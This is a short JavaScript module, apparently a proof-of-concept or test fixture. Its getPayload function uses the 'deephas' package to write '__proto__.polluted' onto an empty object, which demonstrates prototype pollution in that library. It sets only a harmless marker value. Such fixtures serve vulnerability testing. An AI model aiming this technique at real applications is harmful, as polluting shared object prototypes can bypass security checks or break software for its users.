function getPayload() {
    const dh = require("deephas");
    let obj = {};
    dh.set(obj, "__proto__.polluted", "yes");

    return { obj };
}

module.exports = { getPayload };